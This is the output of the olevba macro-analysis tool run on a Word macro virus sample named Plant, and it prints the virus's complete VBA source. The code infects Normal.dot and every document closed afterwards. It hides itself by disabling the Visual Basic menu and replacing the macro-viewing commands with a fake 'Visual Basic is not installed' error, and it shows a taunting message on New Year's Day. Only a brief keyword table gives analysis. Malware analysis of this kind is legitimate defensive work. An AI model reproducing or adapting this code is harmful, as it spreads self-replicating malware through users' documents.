olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Plant
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Plant - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FServPlant.bas 
in file: Virus.MSWord.Plant - OLE stream: 'Macros/VBA/FServPlant'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
' Please, don't delete it, if you are not sure.
'

Sub AutoExec()
    On Error GoTo ErrorInSub
    CommandBars("Visual Basic").Enabled = False
    If DateTime.Day(DateTime.Date) = 1 _
    And DateTime.Month(DateTime.Date) = 1 Then MsgBox _
    prompt:="Happy NewYear ! You are infected by Plant.Virus. " + _
    "Don't panic, i'm KILL you.", _
    buttons:=vbExclamation, _
    Title:="Plant Information"
ErrorInSub:
End Sub
Sub AutoOpen()
    fName = ActiveDocument.Name
    fFullName = ActiveDocument.FullName
    nPath = Options.DefaultFilePath(wdUserTemplatesPath)
    sPath = Options.DefaultFilePath(wdProgramPath)
    
    On Error GoTo ErrorInSub
    If FileSystem.Dir(sPath + "\Plant.doc", vbNormal) = _
    "Plant.doc" Then GoTo FindMainFile
    ActiveDocument.SaveAs FileName:=sPath + "\" + fName
    ActiveDocument.SaveAs FileName:=fFullName
    Name sPath + "\" + fName As sPath + "\Plant.doc"
    AutoExec
FindMainFile:
    CopyMacros nSource:=fFullName, nDestination:=nPath + "\Normal.dot"
ErrorInSub:
End Sub
Sub FileOpen()
    On Error GoTo ErrorInSub
    Dialogs(wdDialogFileOpen).Show
ErrorInSub:
End Sub
Sub AutoClose()
    fFullName = ActiveDocument.FullName
    sPath = Options.DefaultFilePath(wdProgramPath)

    On Error GoTo ErrorInSub
    CopyMacros nSource:=sPath + "\Plant.doc", nDestination:=fFullName
ErrorInSub:
End Sub
Sub ViewVBCode()
    On Error GoTo ErrorInSub
    VBNotToday
ErrorInSub:
End Sub
Sub ToolsMacro()
    On Error GoTo ErrorInSub
    VBNotToday
ErrorInSub:
End Sub
Sub Organizer()
    On Error GoTo ErrorInSub
    VBNotToday
ErrorInSub:
End Sub
Sub ToolsRecordMacroStart()
    On Error GoTo ErrorInSub
    VBNotToday
ErrorInSub:
End Sub
Sub ToolsRecordMacroToggle()
    On Error GoTo ErrorInSub
    VBNotToday
ErrorInSub:
End Sub
Private Sub CopyMacros(nSource, nDestination)
    On Error GoTo ErrorInSub
    Application.OrganizerCopy _
    Source:=nSource, _
    Destination:=nDestination, _
    Name:="FServPlant", _
    Object:=wdOrganizerObjectProjectItems
ErrorInSub:
End Sub
Private Sub VBNotToday()
    On Error GoTo ErrorInSub
    MsgBox _
    prompt:="Microsoft Visual Basic is not installed. " + _
    "Please refer to the online help or documentation of the " + _
    "host application to determine how to install " + _
    "Microsoft Visual Basic.", _
    buttons:=vbExclamation, Title:="Microsoft Visual Basic"
ErrorInSub:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|KILL                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

